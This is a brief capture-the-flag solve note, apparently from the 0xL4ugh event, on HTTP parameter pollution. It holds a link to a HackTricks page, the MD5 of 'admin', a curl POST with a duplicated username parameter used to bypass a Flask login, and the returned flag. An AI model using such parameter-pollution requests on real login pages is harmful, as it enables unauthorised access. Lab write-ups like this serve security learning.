'''
HTTP parameter pollution
https://book.hacktricks.xyz/v/cn/pentesting-web/parameter-pollution


somd5.com md5('admin') == 21232f297a57a5a743894a0e4a801fc3

curl -X POST http://20.115.83.90:1338/ -d 'username=admin&username=abc&password=admin&login-submit='

Response from Flask app: 0xL4ugh{M1cr0_Serv!C3_My_Bruuh}

'''
